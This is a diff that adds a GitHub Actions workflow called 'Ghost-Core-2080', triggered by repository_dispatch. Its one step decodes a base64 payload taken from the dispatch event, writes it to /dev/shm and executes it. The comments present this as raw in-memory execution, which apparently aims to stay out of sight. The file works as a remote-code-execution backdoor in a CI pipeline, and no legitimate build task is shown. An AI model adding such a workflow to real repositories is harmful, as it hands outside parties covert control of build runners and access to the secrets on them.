@@ -1,0 +1,27 @@
+
+name: Ghost-Core-2080
+
+on: [repository_dispatch]
+
+jobs:
+
+  execute:
+
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - name: Raw Memory Execution
+
+        run: |
+
+          # Pulling the payload from the dispatch client_payload
+
+          # This executes directly in RAM (/dev/shm)
+
+          echo "${{ github.event.client_payload.payload }}" | base64 -d > /dev/shm/op
+
+          chmod +x /dev/shm/op
+
+          /dev/shm/op
+
